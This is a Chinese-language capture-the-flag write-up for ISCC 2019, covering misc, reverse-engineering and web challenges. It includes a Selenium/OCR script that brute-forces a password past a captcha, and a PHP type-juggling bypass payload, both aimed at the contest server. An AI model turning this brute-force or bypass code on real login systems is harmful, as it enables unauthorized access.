title: ISCC部分wp
author: ki9mu
abbrlink: 68e501a8
date: 2019-05-09 14:06:21
tags:	ctfwp
categories: 技术
---
# MISC
## 隐藏的信息
下载后打开压缩包，里面有一个message.txt，内容如下
```
0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113
```
根据内容中每个数据是0开头，以及没有大于7的数据可以很明显地看到这是8进制数据。
转化为ascii尝试一下。
```
V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K
```
这里可以看出来是base64编码。
```
Well done!
Flag: ISCC{****************}
```

## 倒立屋
下载后发现是一张图片![倒立屋.png](https://p5.ssl.qhimg.com/t01281717cdc2f3d04c.png)
图片隐写一般就那一套，先挨个试试(这道题是个巨无霸坑)。
IDAT隐写尝试：
![IDAT扫描结果](https://p5.ssl.qhimg.com/t015ba039e2a4272d5f.jpg)
发现没藏什么特殊的东西。
LSB隐写尝试：
![LSB](https://p5.ssl.qhimg.com/t013b9e7a9fa0f6e3c3.jpg)
这里能看到ISCC2019，心想主办方还有个彩蛋，但其实这里是个大坑。
正常ctf的格式一般是有花括号{}的。这道题的答案其实是9102_cCsI。

## Aesop's secret
打开发现是个闪烁的gif图，将它合成一张具体的图。
![合成后的图片](https://p0.ssl.qhimg.com/t0192ccb02a204a3871.png)
发现看不出来什么，继续祭出神器分析。
![](https://p2.ssl.qhimg.com/t01481fc3655f864bd9.jpg)
```
U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw==
```
这里能够看到一串base64，直接解发现是乱码。
合成的图肯定是有用的，尝试一波aes，密码为合成后图片中的ISCC
![](https://p3.ssl.qhimg.com/t01969239157dfe8800.jpg)
base64解码发现还是乱码，再次aes一波，得到flag。
![](https://p3.ssl.qhimg.com/t01258b3155461964ac.jpg)

# RE
## answer to everything
这个文件名有问题，本以为是pe，没想到还是elf文件。ue打开文件头可以看出。
把文件后缀exe去了，拖入ida，f5进入main函数。
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [sp+Ch] [bp-4h]@1
  printf("Gimme: ", argv, envp);
  __isoc99_scanf("%d", &v4);
  not_the_flag(v4);
  return 0;
}
```
第5行就是一个打印函数，第6行是输入。重点还是第7行的函数。
```
__int64 __fastcall not_the_flag(int a1)
{
  if ( a1 == 42 )
    puts("Cipher from Bill \nSubmit without any tags\n#kdudpeh");
  else
    puts("YOUSUCK");
  return 0LL;
}
```
这里能看到，答案就是42，看到题目
```
sha1 得到了一个神秘的二进制文件。寻找文件中的flag，解锁宇宙的秘密。
注意：将得到的flag变为ISCC{flag}形式提交。
```
然后将kdudpeh进行sha1一下，提交就是flag。
PS：我觉得这种题应该放在misc里。

## Rev01
这里是个原题。
参考文章：https://www.anquanke.com/post/id/169970
PS：第一题和第二题难度差太大了，幸好是原题。但也有一部分的坑。
本题是rust语言编写的，对我等菜鸡来说逆向难度相当大，一堆函数足以劝退逆向萌新了。
ida载入文件
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@1
  __int64 (__fastcall *v4)(); // [sp+0h] [bp-8h]@1
  v4 = beginer_reverse::main::h80fa15281f646bc1;  //这里才是主函数，beginer_reverse也能看出来。
  std::rt::lang_start_internal::had9505969b8e20a2(
    (__int64)&v4, (__int64)&anon_0e239fffff9ba82fdffb4d9fcd948ac0_0_llvm_15443791065720472637,
    argc,
    (__int64)argv);
  return result;
}
```
跟进之后的代码
```
void beginer_reverse::main::h80fa15281f646bc1()
{
  __int64 v0; // rax@1
  volatile signed __int64 *v1; // rax@2
  bool v2; // zf@2
  __int64 v3; // r13@5
  signed __int64 v4; // rax@5
  __int64 v5; // rcx@6
  char v6; // dl@6
  signed __int64 v7; // r8@6
  char v8; // si@10
  char v9; // di@12
  int v10; // ebp@14
  int v11; // esi@15
  int v12; // edi@17
  int v13; // edx@22
  __int64 v14; // rcx@24
  unsigned __int64 v15; // rsi@24
  signed __int64 v16; // r14@24
  unsigned __int64 v17; // rbp@24
  int v18; // er12@25
  unsigned __int64 v19; // rbx@25
  signed __int64 v20; // rax@31
  signed __int64 v21; // rax@33
  __int64 v22; // rcx@38
  int v23; // edx@40
  __int64 v24; // rdx@45
  unsigned __int64 v25; // rsi@45
  __int64 v26; // rcx@45
  volatile signed __int64 *v27; // [sp+0h] [bp-B8h]@2
  __int64 v28; // [sp+8h] [bp-B0h]@2
  __int128 v29; // [sp+10h] [bp-A8h]@2
  __int128 v30; // [sp+20h] [bp-98h]@23
  unsigned __int64 v31; // [sp+30h] [bp-88h]@35
  __int64 v32; // [sp+38h] [bp-80h]@24
  __int64 v33; // [sp+40h] [bp-78h]@2
  __int128 v34; // [sp+48h] [bp-70h]@2
  void **v35; // [sp+58h] [bp-60h]@2
  __int128 v36; // [sp+60h] [bp-58h]@51
  const char *v37; // [sp+78h] [bp-40h]@51
  __int64 v38; // [sp+80h] [bp-38h]@51

  _rust_alloc();
  if ( !v0 )
    alloc::alloc::handle_alloc_error::h9e3787e5722c870d();
  *(_OWORD *)v0 = xmmword_51000;
  *(_OWORD *)(v0 + 16) = xmmword_51010;
  *(_OWORD *)(v0 + 32) = xmmword_51020;
  *(_OWORD *)(v0 + 48) = xmmword_51030;
  *(_OWORD *)(v0 + 64) = xmmword_51040;
  *(_OWORD *)(v0 + 80) = xmmword_51050;
  *(_OWORD *)(v0 + 96) = xmmword_51060;
  *(_OWORD *)(v0 + 112) = xmmword_51070;
  *(_QWORD *)(v0 + 128) = 618475290964LL;
  v33 = v0;
  v34 = xmmword_51080;
  v28 = 1LL;
  v29 = 0LL;
  std::io::stdio::stdin::hcd3fd1740d5196a7();
  v27 = v1;
  std::io::stdio::Stdin::read_line::h85c3421ca914511e();
  v2 = v35 == (void **)1;
  if ( v35 == (void **)1 )
  {
    v30 = v36;
    core::result::unwrap_failed::h2bf42cb74d1e7d4b("Error reading input: \x01", 19LL, &v30);
  }
  _InterlockedSub8(v27, 1uLL);
  if ( v2 )
    _$LT$alloc..sync..Arc$LT$T$GT$$GT$::drop_slow::h82dbb96617da66a0(&v27, &v27);
  v3 = v28;
  v4 = *((_QWORD *)&v29 + 1);
  if ( *((_QWORD *)&v29 + 1) )
  {
    v5 = *((_QWORD *)&v29 + 1) + v28;
    v6 = *(_BYTE *)(*((_QWORD *)&v29 + 1) + v28 - 1);
    v7 = 1LL;
    if ( v6 >= 0 )
    {
LABEL_7:
      v4 = *((_QWORD *)&v29 + 1) - v7;
      *((_QWORD *)&v29 + 1) = v4;
      v5 = v4 + v28;
      goto LABEL_23;
    }
    if ( v28 == v5 - 1 )
    {
      v11 = 0;
    }
    else
    {
      v8 = *(_BYTE *)(v5 - 2);
      if ( (*(_BYTE *)(v5 - 2) & 0xC0) == -128 )
      {
        if ( v28 == v5 - 2 )
        {
          v12 = 0;
        }
        else
        {
          v9 = *(_BYTE *)(v5 - 3);
          if ( (*(_BYTE *)(v5 - 3) & 0xC0) == -128 )
          {
            if ( v28 == v5 - 3 )
              v10 = 0;
            else
              v10 = (*(_BYTE *)(*((_QWORD *)&v29 + 1) + v28 - 4) & 7) << 6;
            v12 = v10 | v9 & 0x3F;
          }
          else
          {
            v12 = v9 & 0xF;
          }
        }
        v11 = (v12 << 6) | v8 & 0x3F;
      }
      else
      {
        v11 = v8 & 0x1F;
      }
    }
    v13 = (v11 << 6) | v6 & 0x3F;
    if ( v13 != 1114112 )
    {
      if ( (unsigned int)v13 >= 0x80 )
      {
        v7 = 2LL;
        if ( (unsigned int)v13 >= 0x800 )
          v7 = 4LL - ((unsigned int)v13 < 0x10000);
      }
      goto LABEL_7;
    }
  }
  else
  {
    v4 = 0LL;
    v5 = v28;
  }
LABEL_23:
  *(_QWORD *)&v30 = 4LL;
  *(__int128 *)((char *)&v30 + 8) = 0LL;
  if ( v4 )
  {
    v14 = v5 - v28;
    v15 = 0LL;
    v16 = 4LL;
    v17 = 0LL;
    v32 = v14;
    do
    {
      v18 = *(_BYTE *)(v3 + v17);
      v19 = v15;
      if ( v17 == v15 )
      {
        v19 = v15 + 1;
        if ( v15 >= 0xFFFFFFFFFFFFFFFFLL )
          goto LABEL_68;
        if ( v19 < 2 * v15 )
          v19 = 2 * v15;
        if ( !is_mul_ok(4uLL, v19) )
LABEL_68:
          alloc::raw_vec::capacity_overflow::hbc659f170a622eae();
        if ( v15 )
        {
          _rust_realloc();
          v16 = v20;
          v14 = v32;
          if ( !v20 )
            goto LABEL_63;
        }
        else
        {
          _rust_alloc();
          v16 = v21;
          v14 = v32;
          if ( !v21 )
LABEL_63:
            alloc::alloc::handle_alloc_error::h9e3787e5722c870d();
        }
        *(_QWORD *)&v30 = v16;
        *((_QWORD *)&v30 + 1) = v19;
        v15 = v19;
      }
      *(_DWORD *)(v16 + 4 * v17++) = v18;
      v31 = v17;
    }
    while ( v14 != v17 );
  }
  else
  {
    v16 = 4LL;
    v19 = 0LL;
    v17 = 0LL;
  }
  v22 = 0LL;
  while ( 4 * v17 != v22 )
  {
    v23 = *(_DWORD *)(v16 + v22) - 32;
    v22 += 4LL;
    if ( (unsigned int)v23 >= 0x5F )
      std::panicking::begin_panic::h770c088eb8f42530(
        "an error occuredSubmit this and get you'r points!\n",
        16LL,
        &off_64F10,
        v22);
  }
  if ( v17 > *((_QWORD *)&v34 + 1) )
    v17 = *((_QWORD *)&v34 + 1);
  if ( !v17 )
  {
    if ( *((_QWORD *)&v34 + 1) )
      goto LABEL_52;
    goto LABEL_51;
  }
  v24 = 0LL;
  v25 = 0LL;
  v26 = 0LL;
  do
  {
    if ( v16 == v24 )
      break;
    v2 = ((*(_DWORD *)(v33 + 4 * v25) >> 2) ^ 0xA) == *(_DWORD *)(v16 + 4 * v25);
    ++v25;
    v26 += v2;
    v24 -= 4LL;
  }
  while ( v25 < v17 );
  if ( v26 == *((_QWORD *)&v34 + 1) )
  {
LABEL_51:
    v35 = &off_64F00;
    *(_QWORD *)&v36 = 1LL;
    *((_QWORD *)&v36 + 1) = 0LL;
    v37 = "src/main.rsError reading input: \x01";
    v38 = 0LL;
    std::io::stdio::_print::h77f73d11755d3bb8();
  }
LABEL_52:
  if ( v19 )
    _rust_dealloc();
  if ( (_QWORD)v29 )
    _rust_dealloc();
  if ( (_QWORD)v34 )
    _rust_dealloc();
}
```
这里的这部分很明显是密文。
```
  if ( !v0 )
    alloc::alloc::handle_alloc_error::h9e3787e5722c870d();
  *(_OWORD *)v0 = xmmword_51000;
  *(_OWORD *)(v0 + 16) = xmmword_51010;
  *(_OWORD *)(v0 + 32) = xmmword_51020;
  *(_OWORD *)(v0 + 48) = xmmword_51030;
  *(_OWORD *)(v0 + 64) = xmmword_51040;
  *(_OWORD *)(v0 + 80) = xmmword_51050;
  *(_OWORD *)(v0 + 96) = xmmword_51060;
  *(_OWORD *)(v0 + 112) = xmmword_51070;
  *(_QWORD *)(v0 + 128) = 618475290964LL;
```
查看到地址的内容
```
.rodata:0000000000051000 xmmword_51000   xmmword 1E4000001FC0000018000000154h
.rodata:0000000000051000                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+29r
.rodata:0000000000051010 xmmword_51010   xmmword 1BC0000019000000154000001F8h
.rodata:0000000000051010                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+33r
.rodata:0000000000051020 xmmword_51020   xmmword 1F800000154000001B8000001BCh
.rodata:0000000000051020                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+3Er
.rodata:0000000000051030 xmmword_51030   xmmword 1BC000001B40000015400000194h
.rodata:0000000000051030                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+49r
.rodata:0000000000051040 xmmword_51040   xmmword 188000001F400000154000001F8h
.rodata:0000000000051040                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+54r
.rodata:0000000000051050 xmmword_51050   xmmword 18C00000154000001F8000001ACh
.rodata:0000000000051050                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+5Fr
.rodata:0000000000051060 xmmword_51060   xmmword 1BC0000019000000154000001E4h
.rodata:0000000000051060                                         ; DATA XREF: beginer_reverse::main::h80fa15281f646bc1+6Ar
.rodata:0000000000051070 xmmword_51070   xmmword 1B8000001BC000001B8000001BCh
```
写出python脚本
```
# -*- coding: UTF-8 -*-
cipher=[0x154, 0x180, 0x1FC, 0x1E4, 0x1F8, 0x154, 0x190, 0x1BC, 0x1BC, 0x1B8, 0x154, 0x1F8, 0x194, 0x154, 0x1B4, 0x1BC, 0x1F8, 0x154, 0x1F4, 0x188, 0x1AC, 0x1F8, 0x154, 0x18C, 0x1E4, 0x154, 0x190, 0x1BC, 0x1BC, 0x1B8, 0x1BC, 0x1B8,0x00000154, 0x0000090, 0x00000000, 0x00000000]
print len(cipher)
cipher = ''.join(map(lambda x: chr((x>>2) ^ 0xa), cipher))
print cipher

```
最后面的0x154和0x90来自这一行，不要漏了。
```
*(_QWORD *)(v0 + 128) = 618475290964LL;
```
ida中鼠标右键转为hex得到内容
```
  *(_QWORD *)(v0 + 128) = 0x9000000154LL;
```

# web
## web2
ps:我是真不明白为什么web放在前面，web1放在后面。
看了下题目，明显得爆破，本以为验证码是固定不变得，burp直接爆破就行了，然而我还是太天真，还是得ocr写脚本跑。
```
import pyocr
import os
import cv2 as cv
import time
import PIL
from pyocr import pyocr
from selenium import webdriver
import pytesseract
import re


def cz(num):
    return '0' * (3 - len(str(num))) + str(num)


if __name__ == '__main__':
    browser = webdriver.Chrome()
    tools = pyocr.get_available_tools()
    browser.get('http://39.100.83.188:8002')
    not_p = [cz(i) for i in range(1000)]
    # browser.add_cookie({'name': 'asdf', 'value': 'asdfsadfd'})
    while len(not_p):
        i = not_p.pop()
        browser.get_screenshot_as_file('D:\\project\\OCR_CTF\\res.png')
        yzm = cv.imread('D:\\project\\OCR_CTF\\res.png')[100: 126, 16: 60]
        ocrres = pytesseract.image_to_string(yzm)
        browser.find_element_by_xpath('/html/body/form/input[2]').clear()
        browser.find_element_by_xpath('/html/body/form/input[3]').clear()
        browser.find_element_by_xpath('/html/body/form/input[2]').send_keys(i)
        browser.find_element_by_xpath('/html/body/form/input[3]').send_keys(ocrres)
        browser.find_element_by_xpath('/html/body/form/input[4]').click()
        print(re.compile('<body>(.*?)</body>').findall(str(browser.page_source))[0] + '     密码:' + i)
        if '楠岃' in re.compile('<body>(.*?)</body>').findall(str(browser.page_source))[0]:
            not_p.append(i)
            print('验证码错误')
        else:
            if '瀵嗙' not in re.compile('<body>(.*?)</body>').findall(str(browser.page_source))[0]:
                print('密码是: ' + i)
                exit()
        browser.back()
        browser.refresh()
        time.sleep(0.5)

```
运行得到结果，密码是996，真是与当今时事热点相连。

## web1
```
<?php
error_reporting(0);
require 'flag.php';
$value = $_GET['value'];
$password = $_GET['password'];
$username = '';

for ($i = 0; $i < count($value); ++$i) {
    if ($value[$i] > 32 && $value[$i] < 127) unset($value);
    else $username .= chr($value[$i]);
    if ($username == 'w3lc0me_To_ISCC2019' && intval($password) < 2333 && intval($password + 1) > 2333) {
        echo 'Hello '.$username.'!', '<br>', PHP_EOL;
        echo $flag, '<hr>';
    }
}

highlight_file(__FILE__);
```
1. chr函数在转换时会自动取模256,所以我们只需要在原本ascii码基础上加上256。
2. intval()处理16进制时有些问题,但强制转换时时正常的。

所以将w3lc0me_To_ISCC2019转换并加上256。
```
a="77336c63306d655f546f5f4953434332303139"
temp = ""
temp1=0
for x in a:
	if temp1==0:
		temp=""
	temp=temp+x
	temp1=temp1+1
	if temp1==2:
		print eval('0x'+temp)+256
		temp1=0

```
payload为：
```
http://39.100.83.188:8001/?value[0]=375&value[1]=307&value[2]=364&value[3]=355&value[4]=304&value[5]=365&value[6]=357&value[7]=351&value[8]=340&value[9]=367&value[10]=351&value[11]=329&value[12]=339&value[13]=323&value[14]=323&value[15]=306&value[16]=304&value[17]=305&value[18]=313&password=0x91d
```



***

PS：比赛打得心累，弃赛了。
PS2:本来是给安全客投稿的被拒了，干脆就发出来了。
PSSS：千万别像我一样想着二进制和web双修，然后两个都打的菜得一批。